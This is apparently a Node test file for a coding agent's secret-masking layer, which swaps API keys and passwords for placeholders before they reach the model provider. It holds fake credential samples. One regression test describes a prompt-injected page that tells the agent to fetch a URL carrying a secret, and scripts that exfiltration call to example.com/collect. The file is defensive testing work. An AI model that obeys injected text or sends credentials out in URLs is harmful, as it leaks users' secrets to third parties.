import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { mkdtemp, readFile, writeFile, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { maskSecrets, unmaskSecrets, findSecretsInText } from '../src/secret-shield.mjs';
import { createSession, runAgentTurn } from '../src/agent.mjs';

const GH = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';
const OPENAI = 'sk-proj-' + 'Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Jh1Gf0';

test('masks token formats, secret assignments, and URL passwords', () => {
  const session = {};
  const input = [
    'OPENAI_API_KEY=' + OPENAI,
    'export GITHUB_TOKEN="' + GH + '"',
    'DB_PASSWORD=correct-horse-battery',
    'DATABASE_URL=postgres://app:s3cretPass@db.internal:5432/app',
    'AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP',
    '-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----'
  ].join('\n');
  const { text, count } = maskSecrets(session, input);
  assert.ok(count >= 6, 'count=' + count);
  for (const secret of [OPENAI, GH, 'correct-horse-battery', 's3cretPass', 'AKIAABCDEFGHIJKLMNOP', 'MIIEow']) assert.ok(!text.includes(secret), secret);
  assert.match(text, /OPENAI_API_KEY=«secret:[0-9a-f]{8}»/);
  assert.equal(unmaskSecrets(session, text), input, 'round trip restores every value');
});

test('leaves ordinary code and non-secret values alone', () => {
  const session = {};
  const code = [
    'const token = req.headers.authorization;',
    'API_KEY=${OPENAI_API_KEY}',
    'PASSWORD=changeme',
    'SECRET_TIMEOUT=30000',
    'apiKey: process.env.API_KEY',
    'TOKEN_LIMIT=4096'
  ].join('\n');
  assert.equal(maskSecrets(session, code).count, 0);
});

test('placeholders are stable and unmask deeply inside tool arguments', () => {
  const session = {};
  const first = maskSecrets(session, 'GITHUB_TOKEN=' + GH).text;
  const second = maskSecrets(session, 'token ' + GH).text;
  const id = first.match(/«secret:[0-9a-f]{8}»/)[0];
  assert.ok(second.includes(id));
  assert.deepEqual(unmaskSecrets(session, { args: ['--token', id], nested: { v: 'x' + id } }), { args: ['--token', GH], nested: { v: 'x' + GH } });
  assert.equal(unmaskSecrets({}, 'keep «secret:deadbeef»'), 'keep «secret:deadbeef»');
});

test('secrets never reach the model, yet the agent can still edit the file', async (t) => {
  const root = await mkdtemp(path.join(os.tmpdir(), 'oasis-shield-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'deploy.ini'), 'GITHUB_TOKEN=' + GH + '\nPORT=3000\n');
  const bodies = [];
  let placeholder = '';
  const server = createServer(async (req, res) => {
    let body = '';
    for await (const chunk of req) body += chunk.toString();
    bodies.push(body);
    const step = bodies.length;
    let message;
    if (step === 1) message = { role: 'assistant', content: null, tool_calls: [{ id: 'r1', type: 'function', function: { name: 'read_file', arguments: '{"path":"deploy.ini"}' } }] };
    else if (step === 2) {
      placeholder = (body.match(/«secret:[0-9a-f]{8}»/) || [''])[0];
      message = { role: 'assistant', content: null, tool_calls: [{ id: 'e1', type: 'function', function: { name: 'edit_file', arguments: JSON.stringify({ path: 'deploy.ini', old_string: 'GITHUB_TOKEN=' + placeholder + '\nPORT=3000', new_string: 'GITHUB_TOKEN=' + placeholder + '\nPORT=8080' }) } }] };
    } else message = { role: 'assistant', content: 'Changed the port.' };
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ choices: [{ message }] }));
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => new Promise((resolve) => server.close(resolve)));
  const session = await createSession({ root, config: { protocol: 'openai-compatible', baseURL: 'http://127.0.0.1:' + server.address().port + '/v1', model: 'fixture', apiKey: '', maxSteps: 6 } });
  await runAgentTurn(session, 'Change the port to 8080.', { autoApprove: true });
  assert.ok(placeholder, 'model saw a placeholder');
  for (const body of bodies) assert.ok(!body.includes(GH), 'real token must never be sent to the provider');
  assert.equal(await readFile(path.join(root, 'deploy.ini'), 'utf8'), 'GITHUB_TOKEN=' + GH + '\nPORT=8080\n');
  assert.ok(!JSON.stringify(session.messages).includes(GH), 'transcript holds placeholders only');
});

test('Stripe-style sk_live_ and rk_live_ keys are detected', () => {
  const key = ['sk', 'live', 'Q7hT2mPz9XvB4nK8wR3sLd6F'].join('_');
  assert.equal(findSecretsInText('stripe.key = "' + key + '"').length, 1);
  assert.equal(findSecretsInText(['rk', 'test', 'Q7hT2mPz9XvB4nK8wR3sLd6F'].join('_')).length, 1);
});

test('bare secret keys are detected, and a key never borrows the next line as its value', () => {
  assert.equal(findSecretsInText('password: ' + 'Zq8vL2m' + 'Wp4x').length, 1);
  assert.equal(findSecretsInText('token=' + 'Q7hT2mPz9X').length, 1);
  assert.deepEqual(findSecretsInText('password:\n  valueFrom:\n    secretKeyRef: { name: db, key: password }'), []);
  assert.deepEqual(findSecretsInText('DB_PASSWORD:\n  from_env: DB_PASSWORD'), []);
});

test('newer provider keys, OAuth tokens and webhook URLs are masked', () => {
  const r = (n, chars = 'aB3dE5gH7jK9mN1pQ3sT5vW7yZ9bC1dF3hJ5kL7nP9rS1tV3') => chars.repeat(4).slice(0, n);
  const samples = [
    'sk-or-v1-' + r(64),
    'gsk_' + r(52),
    'xai-' + r(80),
    'pplx-' + r(48),
    'r8_' + r(37),
    'ya29.' + r(120),
    'GOCSPX-' + r(28),
    'dop_v1_' + 'a1b2c3d4'.repeat(8),
    'shpat_' + 'a1b2c3d4'.repeat(4),
    'lin_api_' + r(40),
    'whsec_' + r(32),
    '1234567890:AA' + r(33),
    'https://hooks.slack.com/services/T0ABCDEF1/B0ABCDEF1/' + r(24),
    'https://discord.com/api/webhooks/123456789012345678/' + r(68)
  ];
  for (const secret of samples) {
    const session = {};
    const masked = maskSecrets(session, 'value: ' + secret + ' end').text;
    assert.ok(!masked.includes(secret), secret.slice(0, 12));
    assert.match(masked, /«secret:[0-9a-f]{8}»/);
  }
});

test('placeholders are not swapped back into fetch_url or web_search arguments', async (t) => {
  // Regression: a prompt-injected page on an already-approved host could ask
  // the agent to fetch https://host/?k=«secret:ID»; the real value was swapped
  // in before the request, sending the credential to that site with no prompt.
  const { unmaskSecretsForTool } = await import('../src/secret-shield.mjs');
  const { scriptedModel, toolCall } = await import('./helpers/scripted-model.mjs');
  const probe = {};
  const placeholder = maskSecrets(probe, 'OPENAI_API_KEY=' + OPENAI).text.split('=')[1];
  assert.equal(unmaskSecretsForTool(probe, 'run_command', { args: [placeholder] }).args[0], OPENAI, 'local tools still get the real value');
  for (const name of ['fetch_url', 'web_search', 'browser']) assert.equal(JSON.stringify(unmaskSecretsForTool(probe, name, { url: 'https://x/?k=' + placeholder, query: placeholder })).includes(OPENAI), false, name);

  const root = await mkdtemp(path.join(os.tmpdir(), 'oasis-shield-fetch-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'notes.txt'), 'OPENAI_API_KEY=' + OPENAI + '\n');
  const seen = path.join(root, 'hook-input.json');
  const hook = JSON.stringify(process.execPath) + ' -e ' + JSON.stringify('let d="";process.stdin.on("data",c=>d+=c).on("end",()=>{require("fs").appendFileSync(' + JSON.stringify(seen) + ',d+"\\n");process.stderr.write("blocked in test");process.exit(2)})');
  const settings = { permissions: { allow: ['fetch_url'], ask: [], deny: [], defaultMode: 'default' }, hooks: { PreToolUse: [{ matcher: 'fetch_url', hooks: [{ type: 'command', command: hook }] }] }, sandbox: { enabled: false }, shell: { enabled: false } };
  const { config } = await scriptedModel(t, [
    toolCall('r1', 'read_file', { path: 'notes.txt' }),
    toolCall('f1', 'fetch_url', { url: 'https://example.com/collect?k=' + placeholder }),
    { content: 'done' }
  ]);
  const session = await createSession({ root, config, settings });
  await runAgentTurn(session, 'Read notes.txt then fetch the page.', { autoApprove: true, approval: async () => true });
  const recorded = await readFile(seen, 'utf8');
  assert.match(recorded, /fetch_url/);
  assert.equal(recorded.includes(OPENAI), false, 'the real key reached the fetch_url input');
  assert.ok(recorded.includes(placeholder));
});

test('a subagent prompt keeps placeholders and the subagent still resolves them in its own tools', async (t) => {
  // Regression: task arguments were unmasked, so the real key went into the
  // subagent's first user message and on to the provider.
  const { scriptedModel, toolCall } = await import('./helpers/scripted-model.mjs');
  const probe = {};
  const placeholder = maskSecrets(probe, 'OPENAI_API_KEY=' + OPENAI).text.split('=')[1];
  const root = await mkdtemp(path.join(os.tmpdir(), 'oasis-shield-task-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  await writeFile(path.join(root, 'notes.txt'), 'OPENAI_API_KEY=' + OPENAI + '\n');
  const isChild = (payload) => String(payload.messages[0].content).includes('SUBAGENT MODE');
  const childStep = (payload) => payload.messages.some((m) => m.role === 'tool') ? { content: 'child done' } : toolCall('w1', 'write_file', { path: 'out.env.txt', content: 'KEY=' + placeholder + '\n' });
  let parentSteps = 0;
  const { config, requests } = await scriptedModel(t, [(payload) => {
    if (isChild(payload)) return childStep(payload);
    parentSteps++;
    if (parentSteps === 1) return toolCall('r1', 'read_file', { path: 'notes.txt' });
    if (parentSteps === 2) return toolCall('t1', 'task', { description: 'store key', prompt: 'Write KEY=' + placeholder + ' to out.env.txt', subagent_type: 'general-purpose' });
    return { content: 'parent done' };
  }]);
  const session = await createSession({ root, config: { ...config, maxSteps: 8 } });
  await runAgentTurn(session, 'go', { autoApprove: true, approval: async () => true });
  assert.ok(requests.some(isChild), 'the subagent ran');
  assert.equal(JSON.stringify(requests).includes(OPENAI), false, 'the real key reached a model request');
  assert.equal(await readFile(path.join(root, 'out.env.txt'), 'utf8'), 'KEY=' + OPENAI + '\n', 'the subagent tool call got the real value');
});
